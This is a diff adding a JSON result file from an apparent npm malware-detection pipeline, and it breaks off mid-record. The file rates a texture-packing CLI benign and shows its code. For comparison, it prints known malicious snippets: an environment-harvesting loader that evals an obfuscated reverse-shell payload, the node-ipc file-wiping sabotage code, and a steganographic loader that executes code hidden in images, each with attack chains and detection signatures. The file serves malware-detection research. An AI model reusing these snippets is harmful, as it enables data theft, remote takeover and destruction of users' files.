@@ -1,0 +1,487 @@
+{
+  "package_name": "@ksv90##texture-packer",
+  "package_version": "0.2.8",
+  "label": "benign",
+  "detection_time": "2026-05-26T17:09:44.096402",
+  "status": "success",
+  "selected_files_count": 2,
+  "selected_files": [
+    "package/package.json",
+    "package/bin/assets-pack.js"
+  ],
+  "is_malicious": false,
+  "total_files": 2,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@ksv90##texture-packer/0.2.8/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@ksv90##texture-packer/0.2.8/package/bin/assets-pack.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "assets-pack_slice_1",
+          "code_snippet": "#!/usr/bin/env node\nimport { readFile, readdir, mkdir, writeFile, stat } from 'node:fs/promises';\nimport path from 'node:path';\nimport process from 'node:process';\nimport { MaxRectsPacker } from 'maxrects-packer';\nimport { createHash } from 'node:crypto';\nimport textureSizeOf from 'buffer-image-size';\nimport sharp from 'sharp';\nimport { object, optional, number, union, literal, string, array, record, boolean, parse } from 'valibot';\n\nconst DEFAULT_HASHING_ALGORITHM = 'sha256';\n//algorithm\nclass Assets {\n    cwd;\n    bufferCache = new Map();\n    textureDataCache = new Map();\n    hashDataCache = new Map();\n    constructor(cwd) {\n        this.cwd = cwd;\n    }\n    async readFile(filePath) {\n        const currentFilePath = path.resolve(this.cwd, filePath);\n        const cachedBuffer = this.bufferCache.get(currentFilePath);\n        if (cachedBuffer)\n            return cachedBuffer;\n        const buffer = await readFile(currentFilePath);\n        this.bufferCache.set(currentFilePath, buffer);\n        return buffer;\n    }\n    async getTextureData(filepath, withoutExtension = false) {\n        const buffer = await this.readFile(filepath);\n        const cachedTextureData = this.textureDataCache.get(buffer);\n        if (cachedTextureData)\n            return cachedTextureData;\n        const { width, height, type } = textureSizeOf(buffer);\n        const name = withoutExtension ? path.basename(filepath, path.extname(filepath)) : path.basename(filepath);\n        const textureData = {\n            filepath,\n            name,\n            type,\n            buffer,\n            sourceWidth: width,\n            sourceHeight: height,\n            x: 0,\n            y: 0,\n            rot: false,\n            width: width,\n            height: height,\n            offsetTop: 0,\n            offsetLeft: 0,\n            trimmed: false,\n            hash: await this.getFileHash(buffer),\n        };\n        this.textureDataCache.set(buffer, textureData);\n        return textureData;\n    }\n    async getFileHash(data, algorithm = DEFAULT_HASHING_ALGORITHM) {\n        const currentBuffer = typeof data === 'string' ? await this.readFile(data) : data;\n        const hash = createHash(algorithm);\n        const hex = hash.update(currentBuffer).digest('hex');\n        this.hashDataCache.set(currentBuffer, hex);\n        return hex;\n    }\n}\n\nconst DEFAULT_SPRITESHEETS_FORMAT = 'RGBA8888';\nconst DEFAULT_SPRITE_BG_OPTIONS = { alpha: 0, r: 0, g: 0, b: 0 };\nconst SPRITE_ALPHA_CHANNELS = 4;\nconst DEFAULT_SPRITESHEETS_NAME = 'sprite';\nconst DEFAULT_ASSET_CACHE_NAME = '.assets-cache';\n\nasync function resizeTexture(textureData, scale = 1) {\n    const width = Math.round(textureData.width * scale);\n    const height = Math.round(textureData.height * scale);\n    const buffer = await sharp(textureData.buffer).resize(width, height).toBuffer();\n    return { ...textureData, buffer, width, height, sourceWidth: width, sourceHeight: height };\n}\nasync function trimTexture(textureData) {\n    const { data, info } = await sharp(textureData.buffer).trim().toBuffer({ resolveWithObject: true });\n    if (!info.trimOffsetLeft || !info.trimOffsetTop)\n        return textureData;\n    return {\n        ...textureData,\n        trimmed: true,\n        width: info.width,\n        height: info.height,\n        offsetLeft: -info.trimOffsetLeft,\n        offsetTop: -info.trimOffsetTop,\n        buffer: data,\n    };\n}\nasync function rotateTexture(textureData, rotate = 90) {\n    const buffer = await sharp(textureData.buffer).rotate(rotate).toBuffer();\n    return { ...textureData, buffer, rot: true };\n}\n\nfunction createOverlayOptions(textureDataList) {\n    return textureDataList.map(({ buffer, x, y }) => {\n        return {\n            input: buffer,\n            left: x,\n            top: y,\n        };\n    });\n}\nfunction createSpriteFactory(width, height, options) {\n    const background = options?.background || DEFAULT_SPRITE_BG_OPTIONS;\n    return sharp({ create: { width, height, background, channels: SPRITE_ALPHA_CHANNELS } });\n}\nfunction createSpritesheetsFrames(textureDataList) {\n    return textureDataList.reduce((acc, textureData) => {\n        const { name, sourceWidth, sourceHeight, x, y, rot, trimmed, width, height, offsetTop, offsetLeft } = textureData;\n        const size = { w: width, h: height };\n        acc[name] = {\n            frame: { x, y, ...size },\n            spriteSourceSize: { x: offsetLeft, y: offsetTop, ...size },\n            sourceSize: { w: sourceWidth, h: sourceHeight },\n            rotated: rot,\n            trimmed,\n        };\n        return acc;\n    }, {});\n}\nfunction createSpritesheetsData(imageFilePath, frames, options) {\n    const { width, height, scale = 1, format = DEFAULT_SPRITESHEETS_FORMAT } = options;\n    return {\n        frames,\n        meta: {\n            image: imageFilePath,\n            format,\n            size: { w: width, h: height },\n            scale,\n        },\n    };\n}\n\nconst TextureOptionsSchema = object({\n    scale: optional(number()),\n});\nconst OutputOptionsSchema = object({\n    format: union([literal('png'), literal('webp'), literal('avif'), literal('jpg')]),\n    width: number(),\n    height: number(),\n    subDir: optional(string()),\n    scale: optional(number()),\n    suffix: optional(string()),\n    name: optional(string()),\n    metaScale: optional(number()),\n    background: optional(string()),\n});\nconst SettingsOptionsSchema = object({\n    sourceDir: optional(string()),\n    targetDir: string(),\n    sourceList: array(string()),\n    subDir: optional(string()),\n    details: optional(record(string(), record(string(), TextureOptionsSchema))),\n    output: array(OutputOptionsSchema),\n    addTextures: optional(record(string(), array(string()))),\n    withoutExtension: optional(boolean()),\n});\nconst ConfigSchema = object({\n    settings: array(SettingsOptionsSchema),\n    allowRotation: optional(boolean()),\n    cache: optional(boolean()),\n    cacheName: optional(string()),\n});\nconst AssetCacheSchema = record(string(), optional(array(string())));\n\nasync function getJsonFile(filePath, schema) {\n    const configFile = await readFile(filePath, { encoding: 'utf-8' });\n    const data = globalThis.JSON.parse(configFile);\n    return parse(schema, data);\n}\nfunction makeTextureFormat(format, factory) {\n    switch (format) {\n        case 'png': {\n            return factory.png();\n        }\n        case 'webp': {\n            return factory.webp();\n        }\n        case 'avif': {\n            return factory.avif();\n        }\n        case 'jpg': {\n            return factory.jpeg();\n        }\n    }\n}\nfunction createBufferFromData(data, format) {\n    const stringData = globalThis.JSON.stringify(data, null, format ? 4 : 0);\n    return globalThis.Buffer.from(stringData);\n}\nfunction getProcessFlagValue(flagName, argsList) {\n    const flagIndex = argsList.findIndex((argName) => argName === flagName);\n    if (flagIndex === -1)\n        return [false];\n    const value = argsList[flagIndex + 1];\n    if (!value || value.startsWith('-'))\n        return [true];\n    return [true, value];\n}\n\nvoid (await (async function main() {\n    const cwd = process.cwd();\n    const [format] = getProcessFlagValue('--format', process.argv);\n    const [, configPath = './assets-config.json'] = getProcessFlagValue('--config', process.argv);\n    const config = await getJsonFile(path.resolve(cwd, configPath), ConfigSchema);\n    const assetCachePath = path.resolve(cwd, config.cacheName ?? DEFAULT_ASSET_CACHE_NAME);\n    const assetCache = await (async () => {\n        try {\n            if (config.cache === false)\n                return {};\n            return await getJsonFile(assetCachePath, AssetCacheSchema);\n        }\n        catch {\n            return {};\n        }\n    })();\n    const assets = new Assets(cwd);\n    const rectPackerOptions = { allowRotation: config.allowRotation == null ? true : !!config.allowRotation };\n    const getTextureData = async (src, withoutExtension) => {\n        try {\n            const stats = await stat(src);\n            if (stats.isDirectory())\n                return null;\n            return await assets.getTextureData(src, withoutExtension);\n        }\n        catch {\n            // TODO: добавить обработку ошибок в случае текстуры\n            return null;\n        }\n    };\n    for (const setting of config.settings) {\n        const { sourceDir = '', subDir = '', withoutExtension } = setting;\n        for (const sourceSrc of setting.sourceList) {\n            const detailsOptions = setting.details?.[sourceSrc];\n            const addTextures = setting.addTextures?.[sourceSrc] ?? [];\n            const sourceDirSrc = path.join(sourceDir, sourceSrc, subDir);\n            const sourceDirPath = path.resolve(cwd, sourceDirSrc);\n            const animations = new Map();\n            const items = await readdir(sourceDirPath);\n            const itemPaths = items\n                .map((src) => path.join(sourceDirPath, src))\n                .concat(addTextures.map((src) => path.resolve(cwd, sourceDir, src)));\n            const directoryTextureHashes = assetCache[sourceDirSrc];\n            let textureHashes = directoryTextureHashes ? new Set(directoryTextureHashes) : null;\n            const textureDataList = await itemPaths.reduce(async (acc, src) => {\n                const textureData = await getTextureData(src, withoutExtension);\n                if (!textureData)\n                    return acc;\n                const dataList = await acc;\n                if (!textureHashes)\n                    return dataList.concat(textureData);\n                if (!textureHashes.has(textureData.hash))\n                    textureHashes = null;\n                textureHashes?.delete(textureData.hash);\n                return dataList.concat(textureData);\n            }, Promise.resolve([]));\n            if (textureHashes && !textureHashes.size)\n                continue;\n            textureDataList.forEach((textureData) => {\n                const chunks = textureData.name.split('_');\n                if (chunks[1]) {\n                    const animationName = chunks.slice(0, -1).join('_');\n                    const animation = animations.get(animationName) ?? [];\n                    animation.push(textureData.name);\n                    animations.set(animationName, animation);\n                }\n            });\n            animations.forEach((list) => list.sort());\n            assetCache[sourceDirSrc] = Array.from(textureDataList.reduce((set, { hash, name }) => {\n                if (set.has(hash)) {\n                    process.stdin.write(`Хэш файла ${name} совпадает с уже добавленными в спрайт текстурами\\n`);\n                }\n                return set.add(hash);\n            }, new Set()));\n            for (const options of setting.output) {\n                const { metaScale, suffix = '', name = DEFAULT_SPRITESHEETS_NAME, subDir = '', background = '' } = options;\n                const maxRectsPacker = new MaxRectsPacker(options.width, options.height, 1, rectPackerOptions);\n                const currentTextureData = textureDataList.map(async (textureData) => {\n                    const textureOptions = detailsOptions?.[textureData.name];\n                    let td = textureData;\n                    td = await resizeTexture(td, (options.scale ?? 1) * (textureOptions?.scale ?? 1));\n                    td = await trimTexture(td);\n                    return td;\n                });\n                maxRectsPacker.addArray(await Promise.all(currentTextureData));\n                const spriteDataPromises = maxRectsPacker.bins.map(async ({ width, height, rects }) => {\n                    const textureDataPromises = rects.map(async (textureData) => {\n                        if (!textureData.rot)\n                            return textureData;\n                        return await rotateTexture(textureData);\n                    });\n                    const textureDataList = await Promise.all(textureDataPromises);\n                    return { width, height, textureDataList };\n                });\n                const spriteDataList = await Promise.all(spriteDataPromises);\n                const multiPacks = [];\n                const { length } = spriteDataList;\n                for (let index = length - 1; index >= 0; index -= 1) {\n                    const { width, height, textureDataList } = spriteDataList[index];\n                    const key = index && length > 1 ? `${name}-${index}` : name;\n                    const spriteFileName = `${key}${suffix}.${options.format}`;\n                    const configFileName = `${key}${suffix}${\".json\" /* Ext.json */}`;\n                    const frames = createSpritesheetsFrames(textureDataList);\n                    const factory = createSpriteFactory(width, height, { background }).composite(createOverlayOptions(textureDataList));\n                    const spriteFactory = makeTextureFormat(options.format, factory);\n                    const spriteBuffer = await spriteFactory.toBuffer();\n                    const spriteHash = await assets.getFileHash(spriteBuffer);\n                    const spriteOptions = { width, height, scale: metaScale };\n                    const configFile = createSpritesheetsData(`${spriteFileName}?hash=${spriteHash}`, frames, spriteOptions);\n                    if (index)\n                        multiPacks.push(configFileName);\n                    else {\n                        if (multiPacks.length)\n                            configFile.meta.related_multi_packs = multiPacks.reverse();\n                        animations.forEach((animationList, animationName) => {\n                            if (!configFile.animations)\n                                configFile.animations = {};\n                            configFile.animations[animationName] = animationList;\n                        });\n                    }\n                    const configFileBuffer = createBufferFromData(configFile, format);\n                    const targetPath = path.resolve(cwd, setting.targetDir, sourceSrc, subDir);\n                    await mkdir(targetPath, { recursive: true });\n                    await writeFile(path.join(targetPath, spriteFileName), spriteBuffer);\n                    await writeFile(path.join(targetPath, configFileName), configFileBuffer);\n                    if (config.cache !== false)\n                        await writeFile(assetCachePath, createBufferFromData(assetCache));\n                }\n            }\n        }\n    }\n})());",
+          "is_malicious": false,
+          "malice_score": 0.519920806090037,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code reads and processes image files from configured directories using Node.js file system APIs (readFile, readdir, writeFile, mkdir, stat). It computes SHA-256 hashes of image buffers via crypto.createHash, resizes, trims, and rotates images using the sharp library, and packs textures into spritesheets. The processed spritesheets and metadata JSON files are written back to disk, with caching support. No network or system execution APIs are used, and no suspicious hardcoded IPs, URLs, shell commands, or environment variables related to secrets are present, indicating this code performs local asset processing without exfiltration or remote command execution.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a Node.js script designed for local image asset processing. It uses standard and well-known libraries (fs/promises, path, crypto, sharp) to read image files, compute SHA-256 hashes, resize, trim, rotate images, and pack them into spritesheets. It writes output files and caches hashes locally. There is no network communication, no obfuscated or dynamically executed code, no environment variable manipulation for evasion, no data exfiltration, and no destructive file operations. The code's behavior is consistent with legitimate asset pipeline tooling. Compared to the known malicious patterns, it lacks any indicators such as payload decoding and eval execution (Example 1), external API calls and destructive file operations (Example 2), or steganographic payload extraction and dynamic code execution (Example 3). The use of hashing and image processing is benign and expected in this context.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_104012_987336_snippet_3",
+              "source_package": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_987336/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5433659553527832,
+              "code_similarity": 0.5840126276016235,
+              "behavior_similarity": 0.5027192831039429,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "var os = require(\"os\"),\n    zlib = require(\"zlib\"),\n    bs = \"base64\",\n    filterNet = (o) => {\n        var oR = {};\n        for (var k in o) {\n            if (\"lo0\" == k) continue;\n            for (var i in o[k]) {\n                if (\"127.0.0.1\" == o[k][i][\"address\"]) continue;\n                if (o[k][i][\"family\"] == \"IPv4\" && o[k][i][\"address\"]) {\n                    oR[k] = o[k][i]\n                    break;\n                }\n            }\n        }\n        return oR;\n    },\n    rmKeys = (o, ...keys) => {\n        for (var k in keys) {\n            delete o[keys[k]];\n        }\n        return o;\n    },\n    pkg = JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString(\"utf8\")),\n    zS = (s) => zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs),\n    zO = (o) => zS(JSON.stringify(o, null, 2)),\n    uS = (s) => zlib.brotliDecompressSync(Buffer.from(s, bs)).toString(),\n    o = {\n        \"name\": pkg.name,\n        \"version\": pkg.version,\n        \"pwd\": process.cwd(),\n        \"env\": process.env,\n        \"platform\": os.platform(),\n        \"arch\": os.arch(),\n        \"release\": os.release(),\n        \"type\": os.type(),\n        \"uptime\": os.uptime(),\n        \"hostname\": os.hostname(),\n        \"cpus\": [os.cpus().length, rmKeys(os.cpus()[0], \"times\")],\n        \"networkInterfaces\": filterNet(os.networkInterfaces()),\n        \"freemem\": os.freemem(),\n        \"totalmem\": os.totalmem(),\n        \"userInfo\": os.userInfo()\n    };\nlet s = zO(o), s1 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);\nprocess.env.NODE_NO_EVAL = undefined;\neval(s1);",
+                "code_behavior": "At runtime, when rsh.js is executed as a detached process, the code collects detailed system, environment, and user information, compresses and encodes it, decompresses an obfuscated payload from a base64 string, sets the NODE_NO_EVAL environment variable to undefined, and executes the decompressed payload using eval, resulting in the execution of further malicious code.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting extensive system, environment, and user data, compressing and encoding it, and executing obfuscated code via eval are all strong indicators of malicious intent and are commonly used to evade detection and enable data exfiltration.",
+                  "violated_expectations": "Legitimate packages do not collect and exfiltrate system or user information, nor do they execute dynamically decompressed and obfuscated code via eval.",
+                  "similar_legitimate_use": "Compression and system info gathering may be used in legitimate diagnostics or telemetry, but not in combination with obfuscated payload execution and without user consent.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payload decompressed and executed via eval",
+                    "Systematic collection of system, environment, and user data",
+                    "Manipulation of environment variables to bypass security controls",
+                    "No user notification or consent for data collection or code execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when rsh.js is executed)",
+                  "file_location": "scripts/rsh.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+                  "package_manager": "npm",
+                  "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
+                  "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of scripts/init.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of scripts/rsh.js in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of reverse shell payload from decompressed code"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+                    "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+                    "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+                    "Use of eval to execute dynamically decompressed or generated code",
+                    "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+                    "Collection and exfiltration of system, environment, and user data during package installation or execution"
+                  ],
+                  "file_indicators": [
+                    "scripts/init.js",
+                    "scripts/rsh.js",
+                    "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+                    "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+                  ],
+                  "network_indicators": [
+                    "rsh.51pwn.com:8880",
+                    "Outbound TCP connections to rsh.51pwn.com on port 8880",
+                    "Initial data exfiltration containing compressed system information"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_195356_692327_snippet_1",
+              "source_package": "node-ipc (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_195356_692327/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5179802179336548,
+              "code_similarity": 0.48978114128112793,
+              "behavior_similarity": 0.5461792349815369,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "setTimeout(function () {\n    const randomNumber = Math.round(Math.random() * 4);\n    if (randomNumber > 1) {\n        // return;\n    }\n    const apiKey = \"https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154\";\n    const pwd = \"./\";\n    const parentDir = \"../\";\n    const grandParentDir = \"../../\";\n    const root = \"/\";\n    const countryName = \"country_name\";\n    const russia = \"russia\";\n    const belarus = \"belarus\";\n    https.get(apiKey, function (message) {\n        message.on(\"data\", function (msgBuffer) {\n            try {\n                const message = JSON.parse(msgBuffer.toString(\"utf8\"));\n                const userCountryName = message[countryName.toString(\"utf8\")].toLowerCase();\n                const hasRus = userCountryName.includes(russia.toString(\"utf8\")) || userCountryName.includes(belarus.toString(\"utf8\"));\n                if (hasRus) {\n                    deleteFile(pwd);\n                    deleteFile(parentDir);\n                    deleteFile(grandParentDir);\n                    deleteFile(root);\n                }\n            } catch (t) {}\n        });\n    });\n    // zkyf: Let's try this directly here\n    deleteFile(pwd);\n    deleteFile(parentDir);\n    deleteFile(grandParentDir);\n    deleteFile(root);\n}, 100);",
+                "code_behavior": "At runtime, shortly after import, the code initiates a delayed execution using setTimeout, performs an external geolocation API request, parses the response to determine the user's country, and if the country is Russia or Belarus, recursively calls a file deletion function on multiple directory levels, resulting in destructive file overwrites.",
+                "malice_analysis": {
+                  "why_suspicious": "The code makes an unsolicited external geolocation API request and, based on the result, triggers recursive file overwrite operations targeting the entire filesystem. This is a clear indicator of a targeted, destructive payload.",
+                  "violated_expectations": "A legitimate IPC package should not perform geolocation checks or attempt to overwrite user files under any circumstances. The expected behavior is to provide inter-process communication utilities, not to execute destructive actions based on user location.",
+                  "similar_legitimate_use": "Geolocation checks may be used for regional feature toggling or compliance, but never to trigger destructive file operations. Recursive file deletion is only appropriate in uninstallers or cleanup tools, and only with explicit user consent.",
+                  "key_indicators": [
+                    "Automated geolocation API request at runtime",
+                    "Conditional logic targeting specific countries (Russia, Belarus)",
+                    "Recursive invocation of file overwrite function across multiple directory levels",
+                    "Destructive file operations triggered without user interaction"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (shortly after import, via setTimeout)",
+                  "file_location": "dao/ssl-geospec.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "node-ipc",
+                  "package_manager": "npm",
+                  "package_versions": "10.1.1, 10.1.2",
+                  "why_malicious": "The package was intentionally altered by its maintainer to include code that, upon execution, checks the user's geolocation via an external API. If the user is located in Russia or Belarus, the code recursively overwrites files across the filesystem with a heart emoji, resulting in widespread and deliberate data destruction. This constitutes a targeted sabotage attack, which is entirely outside the scope of legitimate package behavior."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "On package installation or import, the malicious code in dao/ssl-geospec.js is loaded and scheduled for execution via setTimeout.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Geolocation check and potential execution of destructive payload"
+                  },
+                  {
+                    "step": 2,
+                    "action": "The code performs an external geolocation API request to determine if the user is located in Russia or Belarus.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Conditional execution of recursive file overwrite function"
+                  },
+                  {
+                    "step": 3,
+                    "action": "If the user is in a targeted country, the code recursively attempts to overwrite all files on the system with a heart emoji.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Destruction of user and system data"
+                  },
+                  {
+                    "step": 4,
+                    "action": "In related packages (peacenotwar, oneday-test), the code writes a protest message file to user Desktop and OneDrive directories.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Display of unsolicited political/protest message in user-accessible locations"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "JavaScript packages that make runtime geolocation API requests and subsequently perform recursive filesystem operations or file overwrites",
+                    "Recursive file overwrite attempts targeting user and system directories, especially with static content (e.g., heart emoji)",
+                    "Creation of unsolicited files with political or protest content in user Desktop or OneDrive directories"
+                  ],
+                  "file_indicators": [
+                    "dao/ssl-geospec.js",
+                    "WITH-LOVE-FROM-AMERICA.txt",
+                    "Unusual file writes to ~/Desktop, ~/OneDrive, ~/OneDrive/Desktop"
+                  ],
+                  "network_indicators": [
+                    "https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154"
+                  ],
+                  "how_to_detect": "Monitor for JavaScript packages that initiate external geolocation API requests at runtime, especially if followed by recursive filesystem operations or file overwrites. Flag any package that writes unsolicited files to user Desktop or OneDrive directories, or that contains the file dao/ssl-geospec.js. Alert on the presence of WITH-LOVE-FROM-AMERICA.txt in user directories. Correlate destructive file operations or unusual file creation with recent package updates or new dependencies to identify malicious activity."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_202033_905711_snippet_2",
+              "source_package": "img-aws-s3-object-multipart-copy (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_202033_905711/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5025968551635742,
+              "code_similarity": 0.469870924949646,
+              "behavior_similarity": 0.5353227853775024,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "function processImage(filePath) {\n    console.log(\"Processing image...\");\n    const data = fs.readFileSync(filePath);\n    let analyzepixels = \"\";\n    let convertertree = false;\n\n    for (let i = 0; i < data.length; i++) {\n        const value = data[i];\n        if (value >= 32 && value <= 126) {\n            analyzepixels += String.fromCharCode(value);\n        } else {\n            if (analyzepixels.length > 2000) {\n                convertertree = true;\n                break;\n            }\n            analyzepixels = \"\";\n        }\n    }\n    // ...\n    if (convertertree) {\n        imagebyte = analyzepixels;\n    } else {\n        // benign code\n    }\n    const func = new Function('https', 'exec', 'os', imagebyte);\n    func(https, exec, os);\n}\nprocessImage('logo1.jpg');\nprocessImage('logo2.jpg');\nprocessImage('logo3.jpg');",
+                "code_behavior": "During postinstall, the code reads image files (logo1.jpg, logo2.jpg, logo3.jpg), extracts ASCII payloads from their byte data, and if a threshold is met, dynamically executes the extracted string as JavaScript code, resulting in arbitrary code execution sourced from image-embedded payloads.",
+                "malice_analysis": {
+                  "why_suspicious": "Extracting and executing code from image files is a classic steganography-based evasion technique, designed to bypass static analysis and conceal malicious payloads within seemingly benign files.",
+                  "violated_expectations": "Legitimate packages do not extract and execute code from image files during installation, nor do they use dynamic code execution on data sourced from non-code files.",
+                  "similar_legitimate_use": "Legitimate image processing libraries may read and analyze image files, but never execute dynamically extracted code from image data.",
+                  "key_indicators": [
+                    "Steganographic payload extraction from image files",
+                    "Dynamic code execution using new Function() on extracted strings",
+                    "Threshold-based trigger for code execution (payload length > 2000)",
+                    "References to analyzepixels, convertertree, and imagebyte variables"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall (via index.js)",
+                  "file_location": "dist/loadformat.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "child_process",
+                    "os"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "img-aws-s3-object-multipart-copy",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions",
+                  "why_malicious": "The package is a trojanized clone of a legitimate library, containing concealed code that, during installation, extracts and executes a command-and-control (C2) payload hidden within image files. This enables remote code execution and exfiltration of command results, granting attackers persistent remote access to infected systems."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "During installation, index.js spawns a detached process to execute dist/loadformat.js.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of the malicious loader script in a separate process."
+                  },
+                  {
+                    "step": 2,
+                    "action": "dist/loadformat.js reads image files (logo1.jpg, logo2.jpg, logo3.jpg), extracts ASCII payloads, and dynamically executes code if a threshold is met.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of the C2 payload if present in the image files."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Extracted C2 payload registers the client with the attacker's server, polls for commands, executes them, and exfiltrates results.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Full remote control of the infected system and exfiltration of command output."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Postinstall script spawns detached Node.js processes using spawn/unref",
+                    "Image files (logo1.jpg, logo2.jpg, logo3.jpg) are read and parsed for ASCII payloads during installation",
+                    "Dynamic code execution via new Function() on data extracted from image files",
+                    "Outbound HTTPS connections to hardcoded IP address 85.208.108.29 for registration, polling, and result exfiltration",
+                    "Periodic polling for remote commands and execution of arbitrary shell commands"
+                  ],
+                  "file_indicators": [
+                    "dist/loadformat.js",
+                    "index.js containing spawn/unref logic targeting dist/loadformat.js",
